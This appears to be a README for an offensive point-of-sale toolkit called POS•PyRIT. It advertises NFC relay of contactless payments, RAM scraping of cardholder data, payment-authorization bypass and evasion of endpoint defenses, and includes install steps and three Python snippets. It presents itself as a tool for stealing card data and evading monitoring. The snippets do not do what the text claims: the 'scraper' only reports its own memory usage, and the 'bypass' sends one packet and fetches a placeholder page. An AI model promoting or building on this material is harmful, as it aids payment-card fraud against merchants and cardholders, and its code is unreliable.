POS•PyRIT ⚔️💳
The Ultimate Tool for Point-of-Sale Penetration & Recon
POS•PyRIT (Point-of-Sale Python Recon & Interception Toolkit) is an elite POS exploitation framework designed to explore, analyze, and compromise vulnerabilities in modern Point-of-Sale systems. Whether you're performing NFC relays, RAM scraping, or transaction spoofing — this tool is built to make your job faster and stealthier. 🏴‍☠️

🔥 Features
📡 NFC Relay Attacks: Intercept contactless transactions using near-field communication.
🧠 RAM Scraper: Extract sensitive cardholder data directly from memory in real-time.
🔓 Authorization Bypass: Override payment approval logic in select POS firmware.
🕶 Stealth Mode: Designed to evade most standard endpoint defenses and monitoring.
📱 Runs on Android: Fully compatible with non-rooted Android devices using Nfc-Gate.

🚀 Getting Started
✅ Prerequisites
Python 3.x
NFC-enabled Android phone
Nfc-Gate App installed

🔧 Installation
Clone the Repo git clone https://github.com/yourusername/pos_pyrIT.git
cd pos_pyrIT

Build Dependencies ./build/build.sh

Run Installer ./scripts/install.sh


🎯 Execution
./scripts/execute.sh

Ensure NFC is enabled and the Android device is connected. Follow interactive prompts.

🧩 Code Examples
NFC Relay Snippet
import nfc, time

def nfc_relay():
    clf = nfc.ContactlessFrontend('usb')
    while True:
        clf.connect(rdwr={'on-connect': lambda tag: tag.dump()})
        time.sleep(1)

if __name__ == "__main__":
    nfc_relay()


RAM Scraper
import psutil, socket, pickle

def scrape_ram():
    process = psutil.Process()
    return process.memory_info()

def send_data(data):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect(('localhost', 12345))
        s.sendall(pickle.dumps(data))

if __name__ == "__main__":
    data = scrape_ram()
    send_data(data)


Payment Bypass Logic
from scapy.all import *
import requests

def bypass_authorization():
    pkt = IP(dst="192.168.1.1") / TCP(dport=443, flags="PA")
    send(pkt)
    print(requests.get("https://example.com/api/payment").text)
